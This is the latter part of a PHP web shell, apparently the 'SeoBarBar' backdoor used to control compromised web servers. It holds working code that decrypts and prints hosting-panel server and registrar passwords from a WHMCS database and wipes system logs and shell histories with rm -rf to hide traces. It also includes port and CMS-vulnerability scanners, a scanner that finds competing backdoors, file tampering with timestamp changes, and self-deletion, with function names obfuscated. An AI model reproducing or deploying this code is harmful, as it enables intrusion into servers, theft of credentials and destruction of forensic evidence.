<td>&nbsp;&nbsp;&nbsp;&nbsp;<INPUT class='form-control' type='submit' style='color:#000;background-color:'  value='Submit' name='Submit'></td>
</table>
</FORM>
</center>
<hr><br>
";if($_POST['form_action']==2){$db_host=($_POST['db_host']);$db_username=($_POST['db_username']);$db_password=($_POST['db_password']);$db_name=($_POST['db_name']);$cc_encryption_hash=($_POST['cc_encryption_hash']);$link=mysql_connect($db_host,$db_username,$db_password);mysql_select_db($db_name,$link);$query=mysql_query("SELECT * FROM tblservers");while($v=mysql_fetch_array($query)){$ipaddress=$v['ipaddress'];$username=$v['username'];$type=$v['type'];$active=$v['active'];$hostname=$v['hostname'];echo("<center><table border='1'>");$password=decrypt($v['password'],$cc_encryption_hash);echo("<tr><td>Type</td><td>$type</td></tr>");echo("<tr><td>Active</td><td>$active</td></tr>");echo("<tr><td>Hostname</td><td>$hostname</td></tr>");echo("<tr><td>Ip</td><td>$ipaddress</td></tr>");echo("<tr><td>Username</td><td>$username</td></tr>");echo("<tr><td>Password</td><td>$password</td></tr>");echo "</table><br><br></center>";}$link=mysql_connect($db_host,$db_username,$db_password);mysql_select_db($db_name,$link);$query=mysql_query("SELECT * FROM tblregistrars");echo("<center>Domain Reseller <br><table class=tabnet border='1'>");echo("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");while($v=mysql_fetch_array($query)){$registrar=$v['registrar'];$setting=$v['setting'];$value=decrypt($v['value'],$cc_encryption_hash);if($value==""){$value=0;}$password=decrypt($v['password'],$cc_encryption_hash);echo("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");}}}elseif(isset($_GET[hex('delete-logs')])){echo '<br><center><b><span>Delete Logs ( For Safe )</span></b><center><br>';echo "<table style='margin: 0 auto;'><tr valign='top'><td align='left'>";exe("rm -rf /tmp/logs");exe("rm -rf /root/.ksh_history");exe("rm -rf /root/.bash_history");exe("rm -rf /root/.bash_logout");exe("rm -rf /usr/local/apache/logs");exe("rm -rf /usr/local/apache/log");exe("rm -rf error_log");exe("rm -rf /var/apache/logs");exe("rm -rf /var/apache/log");exe("rm -rf /var/run/utmp");exe("rm -rf /var/logs");exe("rm -rf /var/log");exe("rm -rf /var/adm");exe("rm -rf /etc/wtmp");exe("rm -rf /etc/utmp");exe("rm -rf $HISTFILE");exe("rm -rf /var/log/lastlog");exe("rm -rf /var/log/wtmp");echo '<br><br><p>Your Traces Has Been Successfully Deleting ...From the Server';echo "</td></tr></table>";}elseif(isset($_GET[hex('scanner')])){echo "<hr><br>";echo "<center><h2>Scanner SeoBarBar</h2></center><br>";echo "<form method = 'POST'>
						<center>
						<div class = 'row clearfix'>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=".hex($d)."&".hex('cmsvuln')."' style='width: 250px;' height='10'><center>CMS Vulnerability Scanner</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=".hex($d)."&".hex('port-scanner')."' style='width: 250px;' height='10'><center>Port Scanner</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=".hex($d)."&".hex('logs-scanner')."' style='width: 250px;' height='10'><center>Logs Scanner</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=".hex($d)."&".hex('scanz')."' style='width: 250px;' height='10'><center>Backdoor Scanner</center></a>
						</div>
						</div></center></form>";echo "<hr>";}elseif(isset($_GET[hex('cmsvuln')])){function ask_exploit_db($component){$exploitdb="http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=".$component."&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=";$result=@mari_get_contents($exploitdb);if(eregi("No results",$result)){echo"<center><td>Gak ada</td><td><a href='http://www.google.com/search?hl=en&q=download+$component'>Download</a></td></tr>";}else{echo"<td><a href='$exploitdb'>Klik Ini..!</a></td><td><--</td></tr>";}}function get_components($site){$source=@mari_get_contents($site);preg_match_all('{option,(.*?)/}i',$source,$f);preg_match_all('{option=(.*?)(&amp;|&|")}i',$source,$f2);preg_match_all('{/components/(.*?)/}i',$source,$f3);$arz=array_merge($f2[1],$f[1],$f3[1]);$coms=array();if(count($arz)==0){echo "<tr><td style='border-color:white' colspan=3>[~] Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";}foreach(array_unique($arz)as $x){$coms[]=$x;}foreach($coms as $comm){echo"<tr><td>$comm</td>";ask_exploit_db($comm);}}function get_plugins($site){$source=@mari_get_contents($site);preg_match_all("#/plugins/(.*?)/#i",$source,$f);$plugins=array_unique($f[1]);if(count($plugins)==0){echo "<tr><td style='border-color:white' colspan=1>[~]  Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";}foreach($plugins as $plugin){echo"<tr><td>$plugin</td>";ask_exploit_db($plugin);}}function get_numod($site){$source=@mari_get_contents($site);preg_match_all('{?name=(.*?)/}i',$source,$f);preg_match_all('{?name=(.*?)(&amp;|&|l_op=")}i',$source,$f2);preg_match_all('{/modules/(.*?)/}i',$source,$f3);$arz=array_merge($f2[1],$f[1],$f3[1]);$coms=array();if(count($arz)==0){echo "<tr><td style='border-color:white' colspan=3>[~]  Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";}foreach(array_unique($arz)as $x){$coms[]=$x;}foreach($coms as $nmod){echo"<tr><td>$nmod</td>";ask_exploit_db($nmod);}}function get_xoomod($site){$source=@mari_get_contents($site);preg_match_all('{/modules/(.*?)/}i',$source,$f);$arz=array_merge($f[1]);$coms=array();if(count($arz)==0){echo "<tr><td style='border-color:white' colspan=3>[~]  Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";}foreach(array_unique($arz)as $x){$coms[]=$x;}foreach($coms as $xmod){echo"<tr><td>$xmod</td>";ask_exploit_db($xmod);}}function t_header($site){echo '<br><hr color="white"><br><table align="center" border="1" style="border-color=white; text-align:left;" width="50%" cellspacing="1" cellpadding="5">';echo '
<tr>
<td style="border-color=white">Site : <a href="'.$site.'">'.$site.'</a></td>
<td style="border-color=white">Exploit-db</b></td>
<td style="border-color=white">Exploit it !</td>
</tr>
';}echo "<center>";echo '<hr><br>
<h2>CMS Vulnerability Scanner SeoBarBar</h2>
<form method="POST" action=""  class="header-izz">
    <p>Link&nbsp&nbsp<input type="text" style="border:0;border-bottom:1px solid #292929; width:500px;" name="site" value="http://127.0.0.1/" class = "form-control" >
    <br><br>
    CMS
    &nbsp&nbsp&nbsp<select class = "form-control"  name="pilihan" style="border:0;border-bottom:1px solid #292929; width:500px;">
    <option>Wordpress</option>
    <option>Joomla</option>
    <option>Nukes</option>
    <option>Xoops</option> 
    </select><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
    <input class= "form-control" type="submit" style="width: 150px; height: 40px; border-color=white;margin:10px 2px 0 2px;" value="Scan" class="kotak"></p>
</form></center><hr><br>';if($_POST){$site=strip_tags(trim($_POST['site']));t_header($site);echo $x01=($_POST['pilihan']=="Wordpress")?get_plugins($site):"";echo $x02=($_POST['pilihan']=="Joomla")?get_components($site):"";echo $x03=($_POST['pilihan']=="Nuke's")?get_numod($site):"";echo $x04=($_POST['pilihan']=="Xoops")?get_xoomod($site):"";}}elseif(isset($_GET[hex('port-scanner')])){echo "<hr><br><center>";echo '<table><h2>Ports Scanner SeoBarBar</h2><td>';echo '<div class="content">';echo '<form action="" method="post">';if(isset($_POST['host'])&&is_numeric($_POST['end'])&&is_numeric($_POST['start'])){$start=strip_tags($_POST['start']);$end=strip_tags($_POST['end']);$host=strip_tags($_POST['host']);for($i=$start;$i<=$end;$i++){$fp=@fsockopen($host,$i,$errno,$errstr,3);if($fp){echo 'Port '.$i.' is <font color=green>open</font><br>';}flush();}}else{echo '<br /><br /><center><input type="hidden" name="a" value="PortScanner"><input type="hidden" name=p1><input type="hidden" name="p2">
		              <input type="hidden" name="c" value="'.htmlspecialchars($GLOBALS['cwd']).'">
		              <input type="hidden" name="charset" value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
		              Host:<br> <input class = "form-control" type="text" name="host" value="localhost"/><br /><br />
		              Port start: <br><input class = "form-control type="text" name="start" value="0"/><br /><br />
		              Port end: <br><input type="text" name="end" value="5000"/><br /><br />
		              <input class = "form-control type="submit" value="Scan Ports" />
		              </form></center><br /><br />';echo "</center>";echo '</div></table></td><hr><br>';}}elseif(isset($_GET[hex('logs-scanner')])){echo '<hr><br>';echo "<Center>
";echo "<h2>Log Hunter SeoBarBar</h2>";echo "<form action=\"\" method=\"post\">
"; ?><br>Dir :<input name="shc_dir"value="<?=getcwd()?>"class="form-control"style="width:250px"><?php echo "<br>";echo "<input class = 'form-control' style='width:250px;' type=\"submit\" name=\"submit\" value=\"Scan Now!\"/>
";echo "</form><hr><br>
";echo "<pre style=\"text-align: left;\">
";error_reporting(0);if($_POST['submit']){function tampilkan($shcdirs){foreach(scandir($shcdirs)as $shc){if($shc!='.'&&$shc!='..'){$shc=$shcdirs.DIRECTORY_SEPARATOR.$shc;if(!is_dir($shc)&&!eregi("css",$shc)){$fgt=mari_get_contents($shc);$ifgt=exif_read_data($shc);$jembut="COMPUTED";$taik="UserComment";$shcm="/mail['(']/";if($ifgt[$jembut][$taik]){echo "[<font color=#00FFD0>Stegano</font>] <font color=#2196F3>".$shc."</font><br>";}preg_match_all('#[A-Z0-9a-z._%+-]+@[A-Za-z0-9.+-]+#',$fgt,$cocok);$hcs="/base64_decode/";$exif="/exif_read_data/";preg_match($shcm,addslashes($fgt),$mailshc);preg_match($hcs,addslashes($fgt),$shcmar);preg_match($exif,addslashes($fgt),$shcxif);if(eregi('HTTP Cookie File',$fgt)||eregi('PHP Warning:',$fgt)){}if(eregi('tmp_name',$fgt)){echo "[<font color=#FAFF14>Uploader</font>] <font color=#2196F3>".$shc."</font><br>";}if($shcmar[0]){echo "[<font color=#FF3D00>Base64</font>] <font color=#2196F3>".$shc."</font><br>";}if($mailshc[0]){echo "[<font color=#E6004E>MailFunc</font>] <font color=#2196F3>".$shc."</font><br>";}if($shcxif[0]){echo "[<font color=#00FFD0>Stegano</font>] <font color=#2196F3>".$shc."</font> </font><font color=red>{Manual Check}</font><br>";}if(eregi("js",$shc)){echo "[<font color=red>Javascript</font>] <font color=#2196F3>".$shc."</font> { <a href=http://www.unphp.net target=_blank>CheckJS</a> }<br>";}if($cocok[0]){foreach($cocok[0]as $key=>$shcmail){if(filter_var($shcmail,FILTER_VALIDATE_EMAIL)){echo "[<font color=greenyellow>SendMail</font>] <font color=#2196F3>".$shc."</font> { ".$shcmail." }<br>";}}}}else{tampilkan($shc);}}}}tampilkan($_POST['shc_dir']);}echo "</pre>
";echo "</Center>
";echo "</div>";}elseif(isset($_GET[hex('scanz')])){ ?><script type="text/JavaScript">function MM_openBrWindow(n,o,i){window.open(n,o,i)}</script><style type="text/css">.single{border:1px solid #1f4f16;padding:5px}.abunai{color:red;text-decoration:none}.xxx{color:#00f;text-decoration:none}.me{border:0;padding:5px}.isi:disabled{padding:2px;border:1px solid #333;background-color:#ccc;font-size:10px;font-weight:700}.isi{padding:2px;border:1px solid #666;background-color:#fff;font-size:10px;font-weight:700}</style><center><br><h2><a href="?d=<?=hex($d)?>&<?=hex('scanz')?>">Local Backdoor Scanner</a></h2></center><br><br><?php if(isset($_POST['Submit'])){$ceks=array('base64_decode','system','passthru','popen','exec','shell_exec','eval','move_uploaded_file','tmp_name','file_get_contents');foreach($ceks as $ceker){if($_POST[$ceker]<>""){$six.=$_POST[$ceker].".";}}$cek=explode('.',$six); ?><center><table width="100%"border="0"cellpadding="5"><tr><td align="right"class="me"width="30"><b>No</b></td><td align="center"class="me"width="105"><b>T y p e</b></td><td align="center"class="me"><b>F i l e L o c a t i o n</b></td><td align="center"class="me"width="150"><b>L a s t E d i t</b></td><td align="right"class="me"width="100"><b>F i l e S i z e</b></td></tr><br><?php $target=$_POST['target'];foreach(ListFiles($target)as $key=>$file){$dir9=dirname($file);$file9=basename($file);$nFile=strtolower(substr($file,-4,4));$nFile2=strtolower(substr($file,-5,5));if($nFile==".php"|$nFile2==".phtml"|$nFile2==".php5"|$nFile2==".php7"|$nFile2==".phar"){if($file==$_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF']){}else{$ops=@mari_get_contents($file);$op=strtolower($ops);$arr=array('c99_buff_prepare'=>'c 9 9','Solevisible'=>'Solevisible','Alfa-Team'=>'Alfa','Minishell'=>'Minishell','WSOstripslashes'=>'WSO','Cyto'=>'Encr Shell','pwd163'=>'Panen138','Zeerx7'=>'Zeerx7','edoced_46esab'=>'b64','con7ext'=>'con7ext','phpFileManager'=>'phpFileManager','Fileman'=>'Fileman','MARIJUANA'=>'Marijuana','Mini'=>'Mini Shell','68746d6c7370656369616c6368617273'=>'Gelay','AGUSTUS_17_1945'=>'1945','ruzhu'=>'Chinese 1','xiaoxiannv'=>'Chinese 2','abcr57'=>'r 5 7');$sis=0;if($op)$size=filesize($file);$last_modified=filemtime($file);$last=date("M-d-Y H:i",$last_modified);foreach($arr as $key=>$val){if(@preg_match("/$key/",$op)){$sis=1;$i++; ?><tr onmouseout="mout(this)"onmouseover="mover(this)"style="background-color:#e62020"><td align="right"><font color="red"><blink><?=$i?></blink></font></td><td align="center"><font color="red"><blink><?=$val?></blink></font></td><td align="left"><blink>hapus disabled replace <a href="?d=<?php echo hex($dir9); ?>&e=<?php echo hex($file9); ?>"target="_blank"><?=$file?></a><a href="#"class="ajx">[Hapus]</a> [Disabled] [Replaced]</blink></td><td align="center"><font color="red"><blink><?=$last?></blink></font></td><td align="right"><font color="red"><blink><?=$size?>byte</blink></font></td><script>var bgcolor="transparent",change_color="#ffe599";function mover(o){o.style.backgroundColor=change_color}function mout(o){o.style.backgroundColor=bgcolor}</script></tr><?php }}if($sis<>"1"){if((@preg_match("/system\((.*?)\)/",$op))&&(@preg_match("/<pre>/",$op))&&(@preg_match("/empty\((.*?)\)/",$op))){$sis="2";$i++;$val="hidden shell"; ?><tr onmouseout="mout(this)"onmouseover="mover(this)"style="background-color:#bfc0ee"><td align="right"><font color="blue"><?=$i?></font></td><td align="center"><font color="blue"><?=$val?></font></td><td align="left"><a href="?d=<?php echo hex($dir9); ?>&e=<?php echo hex($file9); ?>"target="_blank"><?=$file?></a>[Hapus] [Disabled] [Replaced]</td><td align="center"><font color="blue"><?=$last?></font></td><td align="right"><font color="blue"><?=$size?>byte</font></td><script>var bgcolor="transparent",change_color="#ffe599";function mover(o){o.style.backgroundColor=change_color}function mout(o){o.style.backgroundColor=bgcolor}</script></tr><?php }}if($sis=="0"){foreach($cek as $bugs){if($bugs<>""){if(@preg_match("/$bugs\((.*?)\)/",$op)){$i++; ?><tr onmouseout="mout(this)"onmouseover="mover(this)"style="background-color:#f4e6e7"><td align="right"><?=$i?></td><td align="center"><?=$bugs?></td><td align="left"><a href="?d=<?php echo hex($dir9); ?>&e=<?php echo hex($file9); ?>"target="_blank"><?=$file?></a>[Hapus] [Disabled] [Replaced]</td><td align="center"><?=$last?></td><td align="right"><?=$size?>byte</td><script>var bgcolor="transparent",change_color="#ffe599";function mover(o){o.style.backgroundColor=change_color}function mout(o){o.style.backgroundColor=bgcolor}</script></tr><?php }}}}if($_POST['textV']<>""){$text=$_POST['textV'];if(@preg_match("/$text/",$op)){$i++; ?><tr onmouseout="mout(this)"onmouseover="mover(this)"style="background-color:khaki"><td align="right"><?=$i?></td><td align="center"><?=$text?></td><td align="left"><a href="?d=<?php echo hex($dir9); ?>&e=<?php echo hex($file9); ?>"target="_blank"><?=$file?></a>[Hapus] [Disabled] [Replaced]</td><td align="center"><?=$last?></td><td align="right"><?=$size?>byte</td><script>var bgcolor="transparent",change_color="#ffe599";function mover(o){o.style.backgroundColor=change_color}function mout(o){o.style.backgroundColor=bgcolor}</script></tr><?php }}}}}if($i==0){foreach($cek as $bugs){if($bugs<>""){$x++; ?><tr onmouseout="mout(this)"onmouseover="mover(this)"style="background-color:#007eff"><td align="right"><?=$x?></td><td align="center"><?=$bugs?></td><td align="center">not exist</td><td align="center">no record</td><td align="right">- byte</td></tr><?php }}} ?></table><?php }else{$find=array('others_backdoor','base64_decode','system','passthru','popen','exec','shell_exec','eval','move_uploaded_file','tmp_name','file_get_contents');$target=$_SERVER['DOCUMENT_ROOT']; ?><form method="post"action=""autocomplete="off"id="fCheck"name="fCheck"><center><table width="400"border="1"cellpadding="10"class="single"><tr><td class="me"><center><b>S e l e c t s c a n t y p e :</b><br><table width="200"class="me"><tr><td class="me"><script>function cekKlik(){document.fCheck.cekV.checked?document.fCheck.textV.disabled=!1:document.fCheck.textV.disabled=!0,document.fCheck.cekV.checked?master+=1:0<master?master-=1:master=master,0!=master?document.fCheck.Submit.disabled=!1:document.fCheck.Submit.disabled=!0}</script><?php foreach($find as $bug){ ?><script>var master=0;function checkValue<?=$bug?>(){document.fCheck.<?=$bug?>.checked?master+=1:0<master?master-=1:master=master,document.fCheck.Submit.disabled=0==master}</script><input name="<?=$bug?>"value="<?=$bug?>"type="checkbox"id="<?=$bug?>"onclick="checkValue<?=$bug?>()"><?=$bug?><br><?php } ?><input name="cekV"value="cekV"type="checkbox"id="cekV"onclick="cekKlik()"> <input name="textV"value="other key word"class="isi"disabled onfocus="this.select()"id="textV"><br><br><br><center>Folder scan (no / at the end) :<br><input name="target"value="<?php echo $target; ?>"class="form-control"style="width:450px"height="10"><br></center><br><br><input name="asal"value="abcd"type="hidden"> <input name="Submit"value=" S t a r t  S c a n "type="submit"disabled></td></tr></table></td></tr></table></form><?php } ?><?php }elseif(isset($_GET[hex('killself')])){unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);@unlink(__FILE__);print "<script>window.location='?';</script>";}elseif(isset($_GET[hex('md5xon')])){startmd5();echo '<meta http-equiv="refresh" content="0;url=?d='.hex($d).'&1">';}elseif(isset($_GET[hex('md5xoff')])){stopmd5();echo '<meta http-equiv="refresh" content="0;url=?d='.hex($d).'&1">';}elseif(isset($_GET[hex('logout')])){stopmd5();unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);unset($_SESSION['key']);print "<script>window.location='?';</script>";}elseif(isset($_GET["n"])){echo $a_.'+FILE'.$b_.'
									<form action="" method="post">
										<input name="n" autocomplete="off" class="form-control col-md-3" type="text" value="">
										'.$d_.'
								'.$c_;if(isset($_POST["n"])){if(!$GNJ[25]($_POST["n"])){ER();}else{OK();}}}elseif(isset($_GET["r"])){if(file_exists($d.DIRECTORY_SEPARATOR.uhex($_GET["r"]))){echo $a_.'<h2>Rename '.uhex($_GET["r"]).'</h2>Path: <code>'.$d.'/'.uhex($_GET["r"]).'</code> - Link: <a href="//'.$fullx.'/'.uhex($_GET["r"]).'" target="_blank">'.$fullx.'/'.uhex($_GET["r"]).'</a>'.$b_.'
									<div class="inline">																									
									<input onclick="location.href=\'?d='.$_GET["d"].'&e='.$_GET["r"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;EDIT&nbsp;" /> 
									<input onclick="location.href=\'?d='.$_GET["d"].'&r='.$_GET["r"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;RENAME&nbsp;" /> 
									<input onclick="location.href=\'?d='.$_GET["d"].'&x='.$_GET["r"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;DELETE&nbsp;" />
									<input onclick="location.href=\'?d='.$_GET["d"].'&t='.$_GET["r"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;GANTI TANGGAL&nbsp;" /> 
									<input onclick="location.href=\'?d='.$_GET["d"].'&k='.$_GET["r"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;CHMOD&nbsp;" /> 
									<input onclick="location.href=\'?d='.$_GET["d"].'&s='.$_GET["r"].'\'" type="submit" class="form-control col-md-2" value="&nbsp;VIEW&nbsp;" /> 
									</div>
									<center>
									<form action="" method="post">
										<input name="r" autocomplete="off" class="form-control col-md-3" type="text" value="'.uhex($_GET["r"]).'">
										
										'.$d_.'
								'.$c_;if(isset($_POST["r"])){if($GNJ[26]($_POST["r"])){ER();}else{if($GNJ[27](uhex($_GET["r"]),$_POST["r"])){OK();}else{ER();}}}}else{echo "File not exist! <a href='?d=".hex($d)."&n'>Do you want to create it ?</a>";}}elseif(isset($_GET["z"])){$zip=new ZipArchive;$res=$zip->open(uhex($_GET["z"]));if($res===TRUE){$zip->extractTo(uhex($_GET["d"]));$zip->close();OK();}else{ER();}}else{echo '<table class = "table table-bordered mt-3 hoverTable" >
						<thead>
							<tr>
								<th><center> NAME </center></th>
								<th><center> TYPE </center></th>
								<th><center> SIZE / MD5 </center></th>
								<th><center> LAST MODIFIED</center></th>
								<th><center> OWNER/GROUP </center></th>
								<th><center> PERMISSION </center></th>
								<th><center> ACTION / FILE PATH</center></th>
							</tr>
						</thead>
						<tbody>
							
						';$h="";$j="";$w=$GNJ[13]($d);if($GNJ[28]($w)||$GNJ[29]($w)){foreach($w as $c){$e=$GNJ[14]("\","/",$d);if(!$GNJ[30]($c,".zip")){$zi='';}else{$zi='[<a href="?d='.hex($e).'&z='.hex($c).'">UnZip</a>]';}if($GNJ[31]("$d/$c")){$o="";}elseif(!$GNJ[32]("$d/$c")){$o=" h";}else{$o=" w";}$s=$GNJ[34]("$d/$c")/1024;$s=round($s,3);if($s>=1024){$s=round($s/1024,2)." MB";}else{$s=$s." KB";}if(($c!=".")&&($c!="..")){if(isset($_SESSION["maridono"])){$hasilmd5=md5_file($e.DIRECTORY_SEPARATOR.$c);$codemd5='<input type="text" id="text-box" size="10" value="'.$hasilmd5.'"  onclick="this.select();">';}else{$codemd5="";}if(isset($_SESSION["maridono"])){$codemd6='[<a href="//'.$fullx.'/'.$c.'" target="_blank">URL</a>]
								<input type="text" id="text-box" size="12" value="'.$e.DIRECTORY_SEPARATOR.$c.'"  onclick="this.select();"> ';}else{$codemd6="";}($GNJ[8]("$d/$c"))?$h.='<tr class="r">
							<td>
								<img src = "https://cdn0.iconfinder.com/data/icons/iconico-3/1024/63.png" width = "20px" height = "20px">
								<a class="ajx" href="?d='.hex($e).hex("/".$c).'">'.$c.'</a>
							</td>
							<td><center>Dir</center></td>
							<td class="x">
								<center>-</center>
							</td>
							
							<td class="x">
							<center>
								<a class="ajx" href="?d='.hex($e).'&t='.hex($c).'">'.$GNJ[20]("Y-m-d g:i",$GNJ[21]("$d/$c")).'</a>
								</center>
							</td>
							<td class = "x">
							<center>
							'.$dirinfo["owner"].DIRECTORY_SEPARATOR.$dirinfo["group"].'
							</center>
							</td>
							<td class="x">
							<center>
								<a class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a>
							
							</center>
							</td>
							<td class="x">
							<center>
							   
								[<a class="ajx" href="?d='.hex($e).'&r='.hex($c).'">RENAME</a>]
								[<a class="ajx" href="?d='.hex($e).'&x='.hex($c).'">DELETE</a>]
								'.$codemd6.'
								
								</center>
							</td>
						</tr>
												
						':$j.='<tr class="r">
							<td>
							
								<img src = "https://img.icons8.com/ios/104/000000/file-filled.png" width = "20px" height = "20px">
								<a class="ajx"href="?d='.hex($e).'&s='.hex($c).'">'.$c.'</a>
								
							</td>
							<td>
							<center>
							File
							</center>
							</td>
							<td class="x">
							<center>
								'.$s.' '.$codemd5.'
								</center>
							</td>
							<td class="x">
							<center>
								<a class="ajx" href="?d='.hex($e).'&t='.hex($c).'">'.$GNJ[20]("Y-m-d g:i",$GNJ[21]("$d/$c")).'</a>
								</center>
							</td>	
							<td>
							<center>
							'.$dirinfo["owner"].DIRECTORY_SEPARATOR.$dirinfo["group"].'
							</center>
							</td>
								<td class="x">
								<center>
							<a class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a>
							</center>
							</td>
							
							<td class="x">
								<center>
								[<a class="ajx" href="?d='.hex($e).'&e='.hex($c).'">EDIT</a>] 
								[<a class="ajx" href="?d='.hex($e).'&r='.hex($c).'">REN</a>] 
								'.$zi.'
								[<a class="ajx" href="?d='.hex($e).'&x='.hex($c).'">DEL</a>]
								'.$codemd6.'							</center>
							</td>
						</tr>

						';}}}echo $h;echo '<tr style="background-color:#007bff;" height="2px"><td colspan="7"></td></tr>';echo $j;echo '</tbody>
					
				</table>';} ?><footer class="x"><br><hr><br><center>Copyleft 2021 1st<span style="color:#e25555"></span> <a href="?d=<?=hex($d)?>&<?=hex('killself')?>"class="ajx nav-link">Kill Yourself with Kindness</a></center></footer><?php if(isset($_GET["1"])){echo $f;}elseif(isset($_GET["0"])){echo $g;}else{NULL;} ?><script>$(".ajx").click(function(t){t.preventDefault();var e=$(this).attr("href");history.pushState("","",e),$.get(e,function(t){$("body").html(t)})})</script></body></html><?php function rec($j){global $GNJ;if(trim(pathinfo($j,PATHINFO_BASENAME),'.')===''){return;}if($GNJ[8]($j)){array_map('rec',glob($j.DIRECTORY_SEPARATOR.'{,.}*',GLOB_BRACE|GLOB_NOSORT));$GNJ[35]($j);}else{$GNJ[10]($j);}}function dre($y1,$y2){global $GNJ;ob_start();$GNJ[16]($y1($y2));return $GNJ[36]();}function hex($n){$y='';for($i=0;$i<strlen($n);$i++){$y.=dechex(ord($n[$i]));}return $y;}function uhex($y){$n='';for($i=0;$i<strlen($y)-1;$i+=2){$n.=chr(hexdec($y[$i].$y[$i+1]));}return $n;}function OK(){global $GNJ,$d;$GNJ[38]('$GNJ[9]');redirectkeDepan(hex($d).'&1');exit();}function ER(){global $GNJ,$d;$GNJ[38]('$GNJ[9]');redirectkeDepan(hex($d).'&0');exit();}function x($c){global $GNJ;$x=$GNJ[24]($c);if(($x&0xC000)==0xC000){$u="s";}elseif(($x&0xA000)==0xA000){$u="l";}elseif(($x&0x8000)==0x8000){$u="-";}elseif(($x&0x6000)==0x6000){$u="b";}elseif(($x&0x4000)==0x4000){$u="d";}elseif(($x&0x2000)==0x2000){$u="c";}elseif(($x&0x1000)==0x1000){$u="p";}else{$u="u";}$u.=(($x&0x0100)?"r":"-");$u.=(($x&0x0080)?"w":"-");$u.=(($x&0x0040)?(($x&0x0800)?"s":"x"):(($x&0x0800)?"S":"-"));$u.=(($x&0x0020)?"r":"-");$u.=(($x&0x0010)?"w":"-");$u.=(($x&0x0008)?(($x&0x0400)?"s":"x"):(($x&0x0400)?"S":"-"));$u.=(($x&0x0004)?"r":"-");$u.=(($x&0x0002)?"w":"-");$u.=(($x&0x0001)?(($x&0x0200)?"t":"x"):(($x&0x0200)?"T":"-"));return $u;} 